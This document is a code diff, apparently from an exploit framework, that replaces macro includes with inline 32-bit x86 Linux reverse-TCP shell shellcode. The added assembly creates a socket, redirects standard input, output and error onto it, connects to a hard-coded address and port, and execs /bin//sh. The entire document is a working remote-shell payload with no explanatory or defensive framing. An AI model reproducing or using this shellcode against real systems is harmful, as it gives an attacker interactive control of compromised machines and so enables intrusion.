@@ -16,11 +16,53 @@
 ;
 ;;
 BITS   32
+GLOBAL _start
 
-%include "generic.asm"
+_start:
+	xor  ebx, ebx
 
-%define  USE_SINGLE_STAGE 1
-%include "stager_sock_reverse.asm"
+socket:
+	push ebx
+	inc  ebx
+	push ebx
+	push byte 0x2
+	push byte 0x66
+	pop  eax
+	mov  ecx, esp
+	int  0x80
+	xchg eax, ebx
 
-shell:
-	execve_binsh EXECUTE_REDIRECT_IO
+dup:
+	pop  ecx
+dup_loop:
+	mov  al, 0x3f
+	int  0x80
+	dec  ecx
+	jns  dup_loop
+
+connect:
+	pop  ebx
+	pop  edx
+	push dword 0x0100007f
+	push word 0xbfbf
+	inc  ebx
+	push bx
+	mov  ecx, esp
+	mov  al, 0x66
+	push eax
+	push ecx
+	push ebx
+	mov  ecx, esp
+	inc  ebx
+	int  0x80
+
+execve:
+	push edx
+	push dword 0x68732f2f
+	push dword 0x6e69622f
+	mov  ebx, esp
+	push edx
+	push ebx
+	mov  ecx, esp
+	mov  al, 0x0b
+	int  0x80
